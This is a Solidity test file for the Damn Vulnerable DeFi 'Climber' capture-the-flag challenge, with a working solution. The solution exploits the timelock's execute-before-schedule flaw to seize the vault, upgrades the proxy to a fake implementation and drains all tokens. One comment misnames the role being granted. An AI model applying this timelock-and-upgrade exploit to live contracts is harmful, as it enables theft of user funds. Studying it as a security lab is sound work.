// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberSolution climberSolution = new ClimberSolution(vault, timelock, token, recovery);
        climberSolution.go();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberSolution {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = bytes32(0);
    address recovery;

    constructor(ClimberVault vault_, ClimberTimelock timelock_, DamnValuableToken token_, address recovery_) {
        vault = vault_;
        timelock = timelock_;
        recovery = recovery_;
        token = token_;
    }

    function go() external {
        uint256 N = 4;
        targets = new address[](N);
        values = new uint256[](N);
        dataElements = new bytes[](N);


        // ClimberTimelock::updateDelay(0)
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));

        // ClimberVault::transferOwnership(player)
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", address(this));

        // ClimberTimelock::_grantRole(ADMIN_ROLE, address(this))
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // ClimberSolution::doSchedule()
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("doSchedule()");

        timelock.execute(targets, values, dataElements, salt);


        address climberFakeVault = address(new ClimberFakeVault());

        // We're now the owner of the vault!!!!!
        vault.upgradeToAndCall(climberFakeVault, abi.encodeWithSignature("transferTokenToRecovery(address,address)", token, recovery));
    }

    function doSchedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract ClimberFakeVault {
    function transferTokenToRecovery(DamnValuableToken token, address recovery) external {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
    function proxiableUUID() public pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}